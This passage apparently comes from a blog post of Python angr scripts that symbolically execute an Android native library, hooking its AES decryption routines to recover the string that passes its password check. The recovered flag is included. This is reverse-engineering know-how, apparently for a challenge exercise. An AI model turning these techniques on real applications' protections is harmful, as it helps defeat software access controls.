<span class="token keyword">def</span> <span class="token function">call</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    st <span class="token operator">=</span> it<span class="token punctuation">.</span>state
    <span class="token keyword">if</span><span class="token punctuation">(</span>args <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN-INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span><span class="token string">"CALLING ("</span><span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token string">")"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN_INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span>args<span class="token punctuation">)</span>
    ins_len <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size
    st<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip <span class="token operator">+</span> ins_len<span class="token punctuation">)</span>
    it<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">hook_length</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token punctuation">,</span>unhook_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>flag_size <span class="token operator">=</span> flag_size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
        self<span class="token punctuation">.</span>unhook_addr <span class="token operator">=</span> unhook_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> self<span class="token punctuation">.</span>flag_size
        self<span class="token punctuation">.</span>project<span class="token punctuation">.</span>unhook<span class="token punctuation">(</span>self<span class="token punctuation">.</span>unhook_addr<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token comment"># def hook_print_aes_cbc_d_buffer(st):</span>
<span class="token comment">#     sp   = st.regs.esp</span>
<span class="token comment">#     arg0_str = st.memory.load(sp,23,endness=archinfo.Endness.BE)</span>
<span class="token comment">#     byte_str = bytes.fromhex(hex(st.solver.eval(arg0_str))[2:0])</span>

<span class="token comment"># def hook_print_before_memcpy(st):</span>
<span class="token comment">#     sp = st.regs.esp</span>
<span class="token comment">#     arg0 = st.regs.ecx</span>
<span class="token comment">#     arg1 = st.memory.load(sp+4,4,endness=archinfo.Endness.LE)</span>
<span class="token comment">#     arg2 = st.memory.load(sp+8,4,endness=archinfo.Endness.LE)</span>
<span class="token comment">#     print("s1 = ",st.memory.load(arg0,32,endness=archinfo.Endness.BE),"\ns2 = ",st.memory.load(arg1,32,endness=archinfo.Endness.BE),"\nn = ",st.memory.load(arg2,4,endness=archinfo.Endness.LE))</span>

<span class="token keyword">class</span> <span class="token class-name">MyGetStringUTFChars</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>return_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> size   
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># print("[HOOKED-INFO]EIP:",st.regs.eip,"CALLING GetStringUTFChars(",arg0,arg1,arg2,")")</span>
        flag_addr   <span class="token operator">=</span> <span class="token number">0x5000000</span>
        flag_length <span class="token operator">=</span> self<span class="token punctuation">.</span>size
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> flag_addr
        flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># assume len(flag) &lt;= 64</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Decrypt_Key</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x8500</span>
        sp       <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Decrypt_Key"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Basic_Stirng</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x83A0</span>   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Basic_String"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Aes_cbc_decrypt</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x85D0</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"aes_cbc_decrypt"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">AES_init_ctx_iv</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x9640</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"AES_init_ctx_iv"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">AES_CBC_decrypt_buffer</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0xA3D0</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"AES_CBC_decrypt_buffer"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">,</span>arg2<span class="token punctuation">)</span>

<span class="token comment"># def test_stack(st):</span>
<span class="token comment">#     sp = st.regs.esp</span>
<span class="token comment">#     print("TOP-STACK : ",sp)</span>
<span class="token comment">#     print(st.memory.load(sp,4,endness=archinfo.Endness.LE))</span>
<span class="token comment">#     print(st.memory.load(sp+4,4,endness=archinfo.Endness.LE))</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>flag_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'angr.manager'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./libnative-lib.so'</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9037</span><span class="token punctuation">,</span>MyGetStringUTFChars<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x903D</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9048</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x9054</span><span class="token punctuation">,</span>Aes_cbc_decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x85FA</span><span class="token punctuation">,</span>Decrypt_Key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x83D2</span><span class="token punctuation">,</span>hook_length<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x83D7</span><span class="token punctuation">,</span><span class="token number">0x83D2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x875D</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x878E</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8AE9</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>

    <span class="token comment"># OUTPUT SOMETHING</span>
    <span class="token comment"># p.hook(0x8ADE,hook_print_aes_cbc_d_buffer,0)</span>
    <span class="token comment"># p.hook(0x90BA,hook_print_before_memcpy,0)</span>
    
    aes_cbc_decrypt_off  <span class="token operator">=</span> <span class="token number">0x85D0</span>
    aes_cbc_decrypt_find <span class="token operator">=</span> <span class="token number">0x8AE9</span>
    checkPasswords_off   <span class="token operator">=</span> <span class="token number">0x9000</span>
    checkPasswords_find  <span class="token operator">=</span> <span class="token number">0x90BF</span> <span class="token comment"># 0x90BA</span>
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> base <span class="token operator">+</span> checkPasswords_off<span class="token punctuation">)</span>
    <span class="token comment"># åˆå§‹åŒ–æ ˆ</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x8000000</span> <span class="token operator">+</span> <span class="token number">0xC</span> <span class="token comment"># 0xC TO BE Aligned</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> <span class="token number">0x0</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span>checkPasswords_find<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>stashes<span class="token punctuation">)</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sp <span class="token operator">=</span> fd<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># IPython.embed()</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\ns2 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\nn = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag_number <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_number<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FLAG : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
        IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'stove:spill2:drivable:1\x00'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># main(23) # b'stove:spill2:drivable:1\x00'</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>flag_size<span class="token operator">=</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="solve-name-py"><a href="#solve-name-py" class="headerlink" title="solve_name.py"></a>solve_name.py</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ~/.virtualenvs/angr/bin/python</span>
<span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span>SimProcedure<span class="token punctuation">,</span>SIM_PROCEDURES
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> monkeyhex
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> logging

base <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">call</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    st <span class="token operator">=</span> it<span class="token punctuation">.</span>state
    <span class="token keyword">if</span><span class="token punctuation">(</span>args <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN-INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span><span class="token string">"CALLING ("</span><span class="token punctuation">,</span>function_name<span class="token punctuation">,</span><span class="token string">")"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[FUN_INFO]EIP:"</span><span class="token punctuation">,</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span>args<span class="token punctuation">)</span>
    ins_len <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size
    st<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eip <span class="token operator">+</span> ins_len<span class="token punctuation">)</span>
    it<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">EncryptDecryptUsername</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>call_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>call_addr <span class="token operator">=</span> call_addr
